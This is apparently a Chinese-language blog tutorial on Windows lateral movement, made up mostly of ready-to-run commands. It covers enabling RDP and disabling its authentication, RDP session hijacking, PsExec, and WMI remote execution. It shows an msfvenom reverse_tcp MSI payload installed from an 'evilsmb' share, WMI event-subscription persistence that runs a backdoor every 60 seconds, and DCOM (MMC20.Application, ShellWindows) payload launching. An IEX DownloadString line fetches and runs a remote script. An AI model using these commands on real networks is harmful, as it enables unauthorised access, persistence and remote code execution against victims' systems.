+
+
+
+
+
+
+<h1 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h1><p>需要开启3389端口</p>
+<h2 id="判断是否开启远程桌面"><a href="#判断是否开启远程桌面" class="headerlink" title="判断是否开启远程桌面"></a>判断是否开启远程桌面</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections<br></code></pre></td></tr></table></figure>
+
+<p>看结果，若为0，则表示RDP服务启动；若为1，则表示RDP服务禁用</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230203203306464.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230203203306464</span></p>
+<p>此结果表示禁用</p>
+<p>本地开启远程桌面</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#开启远程桌面连接功能</span><br>reg <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f<br><br><span class="hljs-comment">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</span><br>reg <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0<br><br><span class="hljs-comment">#设置防火墙策略，放行3389端口</span><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br></code></pre></td></tr></table></figure>
+
+
+
+<p>开启远程主机的远程桌面连接功能</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /Node:<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> /<span class="hljs-keyword">User</span>:Administrator /<span class="hljs-keyword">Password</span>:<span class="hljs-keyword">admin</span> RDTOGGLE <span class="hljs-keyword">WHERE</span> ServerName=<span class="hljs-string">&#x27;WIN2016-WEB3&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="RDP-Hijacking-（远程桌面劫持）"><a href="#RDP-Hijacking-（远程桌面劫持）" class="headerlink" title="RDP Hijacking （远程桌面劫持）"></a>RDP Hijacking （远程桌面劫持）</h2><p>大致意思就是，在拥有system权限的前提下，能够不需要凭据，来进行任意的用户切换</p>
+<p>即可以不需要密码，就可以登陆主机上拥有的账户</p>
+<p>比如，现在我用账户A登陆，且拥有system的权限</p>
+<p>寻找其他用户会话</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">query <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>执行上面命令之后，后面是有ID的</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">tscon <span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
+
+<p>这样就可以切换到其他会话</p>
+<h2 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h2><p>这是一款开源的工具，其最大的优势在于，横向时，不用设置内网代理</p>
+<p>将此工具上传到已经攻陷的主机，然后使用即可</p>
+<p>地址</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/0xthirteen/</span>SharpRDP<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>就是一款远程控制工具</p>
+<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>微软官方提供的工具，不怕杀软</p>
+<p>具有命令行的交互性</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用SMB，连接到服务端的Admin$共享</p>
+<p>然后释放名为psexesvc.exe的文件</p>
+<p>注册名字为，PSEXESVC的服务</p>
+<p>客户端执行命令时，服务端通过服务，来执行命令然后回显</p>
+<p>运行结束之后，会自动删除生成的PSEXESVC服务</p>
+<p><strong><font color='red'>简而言之，就是自己创建一个合法的服务，通过这个服务来执行命令</font></strong></p>
+<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>目标机开启Admin$共享</p>
+<p>目标机关闭防火墙，或者放行445端口</p>
+<h2 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h2><p>打开目标机的cmd</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#普通用户<br>psexec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">192.168</span>.<span class="hljs-number">232.135</span> -u Administrator -<span class="hljs-selector-tag">p</span> admin -s cmd<span class="hljs-selector-class">.exe</span>     <br><br>#域用户<br>psexec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">192.168</span>.<span class="hljs-number">232.135</span> -u 域名\Administrator -<span class="hljs-selector-tag">p</span> admin -s cmd<span class="hljs-selector-class">.exe</span>    <br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230203222323477.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230203222323477</span></p>
+<p>impacket工具包和msf里面都有psexec这款工具</p>
+<p>impacket</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">psexec.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
+
+<p>msf</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/windows/</span>smb/psexec<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>WMI是一项windows的核心管理技术</p>
+<p>可以管理本地和远程计算机</p>
+<p>远程传输会用到两个协议</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">分布式组件对象模型	DCOM<br>windows远程管理		WinRM<br></code></pre></td></tr></table></figure>
+
+
+
+<p>横向移动时，一般会用到两个方法</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">通过调用WMI的类方法，进行远程执行<br><br>远程部署WMI事件订阅，在特定的事件发生时触发攻击<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong><font color='red'>WMI攻击条件</font></strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">远程主机开启WMI，一般是默认开启<br><br>远程主机防火墙放行135端口，135端口是WMI的默认端口<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="常规利用方法"><a href="#常规利用方法" class="headerlink" title="常规利用方法"></a>常规利用方法</h2><p><strong><font color='red'>远程查询</font></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查询进程信息</span><br>wmic /node:192.168.232.135 /user:Administrator /password:admin process list brief <br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204105105725.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230204105105725</span></p>
+<p><strong><font color='cornflowerblue'>远程创建进程</font></strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#用cmd执行命令，把结果储存到C:\result.txt<br>wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span> process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204110805993.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230204110805993</span></p>
+<p><font color='red'>WMIC在调用cmd执行命令时，是没有回显的，所以需要写入文件里面</font></p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204110844000.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230204110844000</span></p>
+<p><strong><font color='orange'>远程安装MSI文件</font></strong></p>
+<p>把恶意的MSI文件放在，SMB服务器上，在跳板机上执行命令，远程执行安装MSI文件</p>
+<p>生成MSI恶意文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.232.129 <span class="hljs-attribute">LPORT</span>=1111 -f msi  -o aaa.msi <br></code></pre></td></tr></table></figure>
+
+
+
+<p>开启SMB匿名共享</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204113731756.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230204113731756</span></p>
+<p>跳板机执行远程安装，加载</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span> product <span class="hljs-keyword">call</span> install PackageLocation=&quot;\\192.168.232.152\evilsmb\aaa.msi&quot;<br></code></pre></td></tr></table></figure>
+
+<p>即可收到会话</p>
+<h2 id="常见利用工具"><a href="#常见利用工具" class="headerlink" title="常见利用工具"></a>常见利用工具</h2><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>执行有回显</p>
+<p>属于impacket项目的一个工具</p>
+<p>需要135和445端口，其中445端口开启的目的就是传输交互的信息</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> administrator:admin@<span class="hljs-number">192.168</span>.<span class="hljs-number">232.135</span><br><br><span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;domain&gt;</span>/<span class="hljs-symbol">&lt;username&gt;</span>:<span class="hljs-symbol">&lt;password&gt;</span>@<span class="hljs-symbol">&lt;ip&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>用这个是需要安装impacket库的，但是这个库一直被防火墙拦截</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204125300686.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230204125300686</span></p>
+<p>当然，如果跳板机没有python环境，也可以打包成exe文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">pip install pyinstaller<br><br><span class="hljs-built_in">cd</span> impacket\examples<br><br>pyinstaller <span class="hljs-operator">-F</span> wmiexec.py<br></code></pre></td></tr></table></figure>
+
+<p>exe文件的用法和py一样</p>
+<h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1是powersploit的一个脚本</p>
+<p>通过powershell来执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#远程加载Invoke-WmiCommand.psl脚本</span><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://IP地址:端口/Invoke-WmiCommand.ps1&#x27;</span>)<br><br><span class="hljs-comment">#指定远程系统用户</span><br><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span><br><br><span class="hljs-comment">#指定用户密码</span><br><span class="hljs-variable">$Password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;密码&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-comment">#将用户名和密码整合，以便导入Credential</span><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><br><span class="hljs-comment">#输入要执行的命令</span><br><span class="hljs-variable">$Remote</span> = <span class="hljs-built_in">Invoke-WmiCommand</span> <span class="hljs-literal">-Payload</span> &#123;ipconfig命令&#125; <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;192.168.232.135&quot;</span><br><br><span class="hljs-comment">#输出回显</span><br><span class="hljs-variable">$Remote</span>.PayloadOutput<br></code></pre></td></tr></table></figure>
+
+<p>用python开启一个http服务，来远程加载Invoke-WmiCommand.ps1</p>
+<p>测试无法成功</p>
+<h2 id="WMI事件订阅的利用"><a href="#WMI事件订阅的利用" class="headerlink" title="WMI事件订阅的利用"></a>WMI事件订阅的利用</h2><p><font color='red'>主要用于权限维持，也可以用于横向</font></p>
+<h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>WMI的事件处理功能及其强大，几乎可以对操作系统上发生的任何事情做出响应</p>
+<p>WMI事件订阅主要包括两大板块：事件过滤器（event filter）、事件消费者（event consumer）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">当创建一个进程时<br>通过WMI事件订阅来执行预先设置的特定脚本<br><br>触发事件的具体条件称为“事件过滤器”<br><br>对指定事件发生所作出的响应称为“事件消费者”<br></code></pre></td></tr></table></figure>
+
+
+
+<p>所有的事件过滤器被存储在一个ROOT\subscription:_ _EventFilter对象的实例</p>
+<p>通过创建_ _EventFilter对象实例来部署事件过滤器</p>
+<p>事件消费者是基于ROOT\subscription:_ _EventConsumer系统派生来的类</p>
+<p><font color='red'>部署事件订阅时，需要分别构建Filter和Consumer，并将二者绑在一起</font></p>
+<p><font color='cornflowerblue'>使用该技术需要提供远程主机的管理员的用户凭据</font></p>
+<h3 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h3><h3 id="Sharp-WMIEvent"><a href="#Sharp-WMIEvent" class="headerlink" title="Sharp-WMIEvent"></a>Sharp-WMIEvent</h3><p>这是利用写好的powershell脚本，比手工利用更加方便</p>
+<p>首先搭建SMB共享服务，将攻击载荷上传在共享目录</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230206230317392.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230206230317392</span></p>
+<p>然后在跳板机执行如下命令</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Sharp-WMIEvent -<span class="hljs-keyword">Trigger</span> <span class="hljs-type">Interval</span> -IntervalPeriod <span class="hljs-number">60</span> -ComputerName <span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> -<span class="hljs-keyword">Domain</span> aaa -<span class="hljs-keyword">User</span> Administrator -<span class="hljs-keyword">Password</span> <span class="hljs-keyword">admin</span> -Command &quot;cmd.exe / c \\192.168.232.152\evilsmb\hobbyhorse_x64.exe&quot;<br></code></pre></td></tr></table></figure>
+
+<p>执行之后，在远程主机上会部署一个随机命名的永久事件订阅，并每隔60秒执行一次SMB共享中的载荷，使远程主机上线</p>
+<h1 id="DCOM的利用"><a href="#DCOM的利用" class="headerlink" title="DCOM的利用"></a>DCOM的利用</h1><h2 id="COM和DCOM"><a href="#COM和DCOM" class="headerlink" title="COM和DCOM"></a>COM和DCOM</h2><p>com（组件对象模型）</p>
+<p>com是微软的一套软件组件的二进制接口标准</p>
+<p>实现跨编程语言的进程直接可以通信，可以创建动态对象</p>
+<p>允许代码重用而无需编译</p>
+<p>COM 中的组件是特定于平台的二进制文件，符合标准的应用程序和其他组件可以使用</p>
+<p><font color='red'>使用组件服务的程序包含指向其标准化接口的指针，而不是访问组件的底层数据结构。因此，无论组件如何工作或使用何种语言编写，组件都可以相互通信</font></p>
+<p>dcom（分布式组件对象模型）</p>
+<p>dcom是com的扩展</p>
+<p>dcom是基于com的一系列概念和程序接口</p>
+<p>支持不同机器上的组件进行通信</p>
+<p>可以是客户端程序对象能够请求来自网络中的另一台计算机上的服务器程序对象</p>
+<p><font color='red'>可以允许应用程序实例化和访问远程计算机上的com对象</font></p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">DCOM使用远程过程调用技术（RPC）将<span class="hljs-keyword">COM</span>的功能扩展到本地计算机之外<br></code></pre></td></tr></table></figure>
+
+
+
+<p>综上能进行横向的就只能是DCOM</p>
+<h2 id="DCOM横向移动"><a href="#DCOM横向移动" class="headerlink" title="DCOM横向移动"></a>DCOM横向移动</h2><p>不是说DCOM支持远程访问就能够进行横向</p>
+<p>真正的是因为</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">部分的DCOM组件公开的接口，包含不安全的方法<br></code></pre></td></tr></table></figure>
+
+
+
+<p>常用包含不安全方法的组件</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">MMC20.<span class="hljs-class">Application</span></span><br><br><span class="hljs-variable">Excel.<span class="hljs-class">Application</span></span><br><br><span class="hljs-variable">ShellWindows</span><br><br><span class="hljs-variable">ShellBrowserWindow</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>查看计算机上所有的DCOM程序组件</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Get</span>-CimInstance Win32_DCOMApplication<br><br><span class="hljs-keyword">Get</span>-WmiObject -<span class="hljs-keyword">Namespace</span> ROOT\CIMV2 -<span class="hljs-keyword">Class</span> Win32_DCOMApplication <br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207115402041.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230207115402041</span></p>
+<p>条件</p>
+<p>从上面的命令可以看出，DCOM组件的横向利用，是需要powershell的</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">拥有管理器权限的powershell<br><br>未开启防火墙<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="MMC20-Application"><a href="#MMC20-Application" class="headerlink" title="MMC20.Application"></a>MMC20.Application</h3><p>MMC20.Application对象的Document.ActiveView下存在一个ExecuteShellCommand方法</p>
+<p>可以用来启动子进程并运行执行的程序或系统命令</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl">原理就是<span class="hljs-variable">MMC20.<span class="hljs-class">Application</span></span>会启动一个进程<span class="hljs-variable">aaa.exe</span><br><br><span class="hljs-variable">ExecuteShellCommand</span>可以在进程中创建子进程，子进程就可以是我们的攻击载荷<br></code></pre></td></tr></table></figure>
+
+<p><font color='red'>适用于win7及其以上版本</font></p>
+<p>首先搭建SMB匿名共享，然后放入后门文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support <br></code></pre></td></tr></table></figure>
+
+
+
+<p>现在需要对方主机的管理员权限的powershell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/netonly /u</span>ser:aaa\administrator powershell<br><br>a<span class="hljs-string">&#x27;a&#x27;</span>a：对方主机电脑名 （可省略）<br>administrator：管理员组的用户的用户名<br></code></pre></td></tr></table></figure>
+
+<p>输入之后需要对方管理员的凭据</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207142522182.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230207142522182</span></p>
+<p>然后执行如下命令</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#通过ProgID与DCOM进行远程交互<br><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;192.168.232.136&quot;</span>))<br><br>#调用ExecuteShellCommand方法启动进程，运行攻击载荷<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c\\192.168.232.152\evilsmb\hobbyhorse_x64.exe&quot;</span>, <span class="hljs-string">&quot;minimized&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="ShellWindows"><a href="#ShellWindows" class="headerlink" title="ShellWindows"></a>ShellWindows</h3><p>shellwindows这个组件提供了Document.Application.ShellExecute方法</p>
+<p>可以启动指定的子进程来运行指定的程序或系统命令</p>
+<p>ShellWindows对象没有ProgID，需要使用CLSID来创建实例</p>
+<p>需要使用OleViewDotNet来找到CLSID</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">9BA05972</span>-F6A8-<span class="hljs-number">11</span>CF-A442-<span class="hljs-number">00</span>A0C90A8F39<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207194006281.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230207194006281</span></p>
+<p>和MMC20.Application差不多，也是需要对方的管理员权限的powershell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/netonly /u</span>ser:aaa\administrator powershell<br><br>aaa：对方主机电脑名 （可省略）<br>administrator：管理员组的用户的用户名<br></code></pre></td></tr></table></figure>
+
+
+
+<p>然后弹出拥有对方管理员权限的powershell</p>
+<p>然后</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#建立远程交互<br><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[Activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[Type]</span>::<span class="hljs-built_in">GetTypeFromCLSID</span>(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>, <span class="hljs-string">&quot;192.168.232.137&quot;</span>))<br><br>#调用shellexecute方法启动子进程，远程开启计算机程序<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Item</span>()<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>, <span class="hljs-string">&quot;C:\Windows\System32&quot;</span>, <span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207202751398.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230207202751398</span></p>
+<p>也可以通过SMB服务，进行远程执行恶意文件</p>
+<p>修改这一项即可</p>
